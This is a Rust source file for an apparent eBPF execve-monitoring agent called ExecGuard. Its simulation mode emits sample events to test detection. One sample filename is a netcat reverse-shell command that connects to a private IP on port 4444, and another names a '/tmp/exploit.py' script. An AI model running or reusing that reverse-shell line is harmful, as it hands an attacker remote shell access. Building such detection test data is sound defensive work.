use aya::{include_bytes_aligned, Ebpf};
use clap::Parser;
use log::{info, warn};
use tokio::signal;
use tokio::sync::mpsc;
use serde::{Serialize, Deserialize};
use std::time::Duration;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AgentEvent {
    pub pid: u32,
    pub uid: u32,
    pub gid: u32,
    pub timestamp_ns: u64,
    pub comm: Vec<u8>,
    pub filename: Vec<u8>,
    pub argc: u32,
    pub risk_score: f32,
}

#[derive(Debug, Parser)]
struct Opt {
    #[clap(short, long, default_value = "info")]
    log_level: String,
    
    #[clap(long)]
    simulate: bool,
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let opt = Opt::parse();
    
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or(&opt.log_level)
    ).init();
    
    let (tx, mut rx) = mpsc::channel::<AgentEvent>(10000);
    
    // Task: output handler
    tokio::spawn(async move {
        while let Some(event) = rx.recv().await {
            let json = serde_json::to_string(&event).unwrap();
            println!("{}", json);
        }
    });
    
    if opt.simulate {
        info!("Running in SIMULATION mode (no eBPF)");
        run_simulation(tx).await?;
    } else {
        info!("Starting ExecGuard eBPF loader...");
        match run_ebpf(tx.clone()).await {
            Ok(_) => {}
            Err(e) => {
                warn!("eBPF failed (WSL?): {}. Use --simulate for demo mode.", e);
                warn!("Falling back to simulation mode...");
                run_simulation(tx).await?;
            }
        }
    }
    
    Ok(())
}

async fn run_ebpf(_tx: mpsc::Sender<AgentEvent>) -> Result<(), anyhow::Error> {
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../execguard-ebpf/target/bpfel-unknown-none/debug/execguard"
    ))?;
    
    let program: &mut aya::programs::KProbe = bpf
        .program_mut("execguard")
        .ok_or(anyhow::anyhow!("Program 'execguard' not found"))?
        .try_into()?;
    program.load()?;
    program.attach("do_execve", 0)?;
    info!("eBPF kprobe attached to do_execve");
    
    signal::ctrl_c().await?;
    info!("Shutting down...");
    
    Ok(())
}

async fn run_simulation(tx: mpsc::Sender<AgentEvent>) -> Result<(), anyhow::Error> {
    info!("Generating simulated execve events...");
    
    // CORRECAO: Vec com tamanho correto (256 bytes)
    let mut comm1 = vec![0u8; 16];
    comm1[..4].copy_from_slice(b"bash");
    
    let mut filename1 = vec![0u8; 256];
    let f1 = b"/tmp/nc -e /bin/bash 192.168.1.100 4444";
    filename1[..f1.len()].copy_from_slice(f1);
    
    let mut comm2 = vec![0u8; 16];
    comm2[..4].copy_from_slice(b"sudo");
    
    let mut filename2 = vec![0u8; 256];
    let f2 = b"/usr/bin/sudo";
    filename2[..f2.len()].copy_from_slice(f2);
    
    let mut comm3 = vec![0u8; 16];
    comm3[..7].copy_from_slice(b"python3");
    
    let mut filename3 = vec![0u8; 256];
    let f3 = b"/tmp/exploit.py";
    filename3[..f3.len()].copy_from_slice(f3);
    
    let events = vec![
        AgentEvent {
            pid: 1234, uid: 1000, gid: 1000,
            timestamp_ns: 0,
            comm: comm1,
            filename: filename1,
            argc: 5, risk_score: 0.0,
        },
        AgentEvent {
            pid: 1235, uid: 0, gid: 0,
            timestamp_ns: 0,
            comm: comm2,
            filename: filename2,
            argc: 1, risk_score: 0.0,
        },
        AgentEvent {
            pid: 1236, uid: 1001, gid: 1001,
            timestamp_ns: 0,
            comm: comm3,
            filename: filename3,
            argc: 2, risk_score: 0.0,
        },
    ];
    
    for event in events {
        tx.send(event).await?;
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    
    info!("Simulation complete. Press Ctrl+C to exit.");
    signal::ctrl_c().await?;
    
    Ok(())
}
